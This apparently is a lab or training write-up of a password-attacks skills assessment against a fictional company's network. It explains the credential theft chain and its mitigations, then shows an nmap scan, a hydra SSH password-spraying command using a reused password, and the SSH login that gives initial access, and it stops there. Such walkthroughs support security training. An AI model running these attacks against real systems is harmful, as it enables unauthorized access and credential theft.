#  Skills Assessment – Password Attacks

## The Credential Theft Shuffle

The **Credential Theft Shuffle**, a term popularized by Sean Metcalf, outlines a systematic method adversaries use to compromise Active Directory environments through credential abuse. The attack chain typically begins with initial access — often via phishing or exposed services — followed by privilege escalation to obtain local administrator rights. From there, tools like **Mimikatz** are used to extract credentials from memory.

Armed with valid credentials, attackers move laterally across the network using techniques like **Pass-the-Hash (PtH)** and tools such as **NetExec**, seeking out further credential caches and access opportunities. This process often culminates in full **domain dominance**, achieved through actions like **DCSync** attacks or compromising **Domain Admin** accounts.

Mitigation requires a layered defense strategy, including:
- Enforcing **multi-factor authentication**
- Deploying **Local Administrator Password Solution (LAPS)**
- Restricting lateral movement through **network segmentation** and **tiered administration**

## Assessment Overview

Our target organization is **Nexura LLC**, where an employee named **Betty Jayde** is suspected of password reuse across multiple platforms. Intelligence indicates she commonly uses the password:
`Texas123!@#`


We aim to leverage this password to gain initial access and escalate to domain-level privileges.

### In-Scope Hosts

| Host    | IP Address               |
|---------|--------------------------|
| DMZ01   | 10.129.\*.*/172.16.119.13 |
| JUMP01  | 172.16.119.7             |
| FILE01  | 172.16.119.10            |
| DC01    | 172.16.119.11            |

---

## Pivoting Primer

The internal systems (**JUMP01**, **FILE01**, **DC01**) are located on a private subnet and are not directly accessible from the internet. The only externally reachable host is **DMZ01**, which bridges both the external and internal networks — a classic **DMZ** configuration.

To reach internal assets, we must first **compromise DMZ01**, then use it as a **pivot point**. By routing our tools (e.g., proxychains, SOCKS tunnels) through DMZ01, we can interact with the internal network as though we were directly connected.

Once foothold is established on DMZ01, refer to the module cheat sheet or enumeration steps below to continue lateral movement, escalate privileges, and extract credentials to ultimately gain command execution on **DC01**.

## What is the NTLM hash of NEXURA\Administrator?


## Step 1: Target Reconnaissance

We began with a port and service scan of the external IP.

**Command:**
```
nmap -A 10.129.234.116
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
```
Only SSH was available, confirming that DMZ01 is a Linux host with no SMB, RDP, or WinRM services exposed.

## Step 2: Password Reuse Attack (Betty Jayde)

Given the known reused password (Texas123!@#), we attempted SSH brute-force against likely usernames using hydra.

```
sudo nano usernames.txt
```

<img width="656" height="251" alt="image" src="https://github.com/user-attachments/assets/de28b6bf-27a0-4157-9ea5-e51d3bdd64c7" />

```
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4 -f
```

<img width="1023" height="460" alt="image" src="https://github.com/user-attachments/assets/31e22c12-2dba-4924-b82c-dfabb5c3c735" />

## Step 3: Gaining Shell Access (Initial Foothold)

With valid SSH credentials, we connected to the DMZ host.

```
ssh betty@10.129.234.116
```
This granted us a foothold on the externally accessible DMZ01 machine.

<img width="1479" height="238" alt="image" src="https://github.com/user-attachments/assets/3672e17d-8e7e-4bbd-ad5f-33560af38180" />


